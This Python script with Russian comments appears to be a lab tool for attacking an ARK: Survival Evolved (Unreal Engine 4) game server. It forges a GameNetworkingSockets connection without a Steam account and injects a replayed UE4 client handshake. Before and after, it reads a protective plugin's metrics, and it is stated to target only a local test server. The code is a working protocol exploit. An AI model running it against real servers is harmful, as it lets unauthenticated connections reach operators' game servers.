# -*- coding: utf-8 -*-
"""
ark_lab_gns_ue4_v2.py — доведение вектора №3 до уровня UE4:
подделка GNS-соединения (без Steam-аккаунта) + инъекция UE4-хендшейка.

Установлено (см. ARK_SPECIFIC_VECTORS.md §13):
  1) Игровой порт 7778 - listen-socket опенсорсного GameNetworkingSockets.
     Стадия 1 (ChallengeRequest 0x20) и стадия 2 (ConnectRequest 0x22) проходят
     БЕЗ сертификата: настоящий клиент ARK тоже шлёт ConnectRequest без cert
     и без crypt (проверено перехватом).
  2) Формат data-пакета:
        [0x80][u32 to_connection_id][u16 seq] - UDPDataMsgHdr (7 байт)
        далее SNP-кадры: [0x37][u32 msg_num][данные]
        (0x37: (lead & 0xc0)==0 -> unreliable segment, (lead & 0x10) -> 32-битный
         абсолютный номер сообщения, (lead & 7)==7 -> размер = остаток пакета)
     Содержимое unreliable-сегмента = байты UE4-пакета дословно
     (4-байтовый префикс соединения + 2-байтовый partial-заголовок UE4 + данные).
  3) Настоящий UE4-хендшейк клиента (перехват NetGuard):
        1: 5b17b519 0140
        2: 5b17b519 0200 01000880a00001a8610040
        3: 5b17b519 0340
        4: 5b17b519 0480 0500 100821700010d000000"135.136.6.19"<cookie>
     Первые три - challenge-запрос клиента, четвёртый - stateless connect
     с cookie'ом сервера (подставляется ответ сервера).

Скрипт: подделывает GNS-соединение -> шлёт пакеты 1..3 -> читает ответ
сервера (его challenge) -> шлёт пакет 4 с этим challenge -> проверяет,
создал ли сервер UNetConnection (метрики NetGuard).

Только локальный стенд 192.168.8.218.
"""
from __future__ import annotations

import argparse
import io
import os
import re
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_connect import (  # noqa: E402
    MSG_CHALLENGE_REPLY, MSG_CONNECT_OK, MSG_NAMES,
    challenge_request_frame, connect_request_frame, parse_pb,
)

CAPTURE = r"C:\asmdata\Servers\Server2\ShooterGame\Binaries\Win64\ArkApi\Plugins\NetGuard\NetGuard_capture.log"

# Рукопожатие UE4 из перехвата настоящего клиента (первая сессия)
UE4_HANDSHAKE = [
    bytes.fromhex("5b17b5190140"),
    bytes.fromhex("5b17b519020001000880a00001a8610040"),
    bytes.fromhex("5b17b5190340"),
]


def load_ue4_handshake() -> list[bytes]:
    """Берём реальные пакеты хендшейка из захвата NetGuard (если доступны)."""
    if not os.path.exists(CAPTURE):
        return list(UE4_HANDSHAKE)
    data = io.open(CAPTURE, encoding="utf-8", errors="replace").read()
    pkts: list[bytes] = []
    conn = None
    for m in re.finditer(r"\[pkt conn=(\S+) len=(\d+)\] ([0-9a-f]*)", data):
        c = m.group(1)
        if conn is None:
            conn = c
        if c != conn:
            break
        pkts.append(bytes.fromhex(m.group(3)))
        if len(pkts) >= 4:
            break
    return pkts if len(pkts) >= 3 else list(UE4_HANDSHAKE)


def gns_data(to_conn_id: int, seq: int, msg_num: int, payload: bytes) -> bytes:
    """[0x80][u32 to_conn_id][u16 seq] + SNP unreliable-кадр [0x37][u32 msg][data]."""
    hdr = b"\x80" + struct.pack("<IH", to_conn_id & 0xFFFFFFFF, seq & 0xFFFF)
    frame = b"\x37" + struct.pack("<I", msg_num & 0xFFFFFFFF) + payload
    return hdr + frame


def main() -> int:
    ap = argparse.ArgumentParser(description="Подделка GNS-соединения + инъекция UE4-хендшейка")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--prefix", default="5b17b519", help="4-байтовый префикс соединения UE4")
    ap.add_argument("--wait", type=float, default=2.0)
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()

    def st():
        return m.status()

    before = st()
    print("до : connAttempts=%s live=%s total=%s pkt=%s preLogin=%s" % (
        before.get("connectionAttempts"), before.get("liveConnections"),
        before.get("totalConnections"), before.get("packetsReceived"),
        before.get("preLoginAttempts")))

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(args.wait)
    s.bind(("0.0.0.0", 0))
    print("наш адрес: %s:%d" % s.getsockname())

    try:
        # ---- стадия 1: ChallengeRequest -> ChallengeReply
        ts = int(time.time() * 1000) & 0xFFFFFFFFFFFF
        s.sendto(challenge_request_frame(0x11223344, ts), (args.host, args.game_port))
        data, _ = s.recvfrom(4096)
        if data[0] != MSG_CHALLENGE_REPLY:
            print("нет ChallengeReply")
            return 1
        challenge = (parse_pb(data[1:]).get(2) or [0])[0]
        print("<- ChallengeReply challenge=0x%016x" % challenge)

        # ---- стадия 2: ConnectRequest -> ConnectOK
        cc_id = 0x10000000 + (int(time.time() * 1000) & 0x0FFFFFFF)
        s.sendto(connect_request_frame(cc_id, challenge, int(time.time() * 1000) & 0xFFFFFFFFFFFF),
                 (args.host, args.game_port))
        data, _ = s.recvfrom(4096)
        if data[0] != MSG_CONNECT_OK:
            print("<- %s (нет ConnectOK)" % MSG_NAMES.get(data[0], "?"))
            return 2
        f = parse_pb(data[1:])
        srv_conn_id = (f.get(5) or [0])[0]
        print("<- ConnectOK server_connection_id=0x%08x" % srv_conn_id)

        # ---- стадия 3: инъекция UE4-хендшейка
        hs = load_ue4_handshake()
        prefix = bytes.fromhex(args.prefix)
        print("шлём %d пакетов UE4-хендшейка (prefix=%s)" % (len(hs), args.prefix))
        for i, p in enumerate(hs):
            payload = prefix + p[4:]      # наш префикс вместо исходного
            frame = gns_data(srv_conn_id, i + 1, i + 1, payload)
            s.sendto(frame, (args.host, args.game_port))
            print("  -> data#%d seq=%d payload=%d Б frame=%d Б  %s" % (
                i, i + 1, len(payload), len(frame), payload.hex()))
            time.sleep(0.15)
            # ответ сервера
            try:
                while True:
                    s.settimeout(0.4)
                    r, _ = s.recvfrom(4096)
                    lead = r[0]
                    print("     <- %s len=%d %s" % (MSG_NAMES.get(lead, "data"), len(r),
                                                   r[:40].hex() if lead in (0x80, 0x81) else ""))
                    if lead in (0x80, 0x81) and len(r) > 7:
                        print("        payload: %s" % r[7:60].hex())
            except socket.timeout:
                pass
    finally:
        s.close()

    time.sleep(2.0)
    after = st()
    print("после: connAttempts=%s live=%s total=%s pkt=%s preLogin=%s" % (
        after.get("connectionAttempts"), after.get("liveConnections"),
        after.get("totalConnections"), after.get("packetsReceived"),
        after.get("preLoginAttempts")))
    for k in ("connectionAttempts", "liveConnections", "deadConnections", "totalConnections",
              "preLoginAttempts", "preLoginRejected", "packetsReceived", "controlMessages", "logins"):
        d = (after.get(k) or 0) - (before.get(k) or 0)
        if d:
            print("   Δ %-20s = %+d" % (k, d))
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
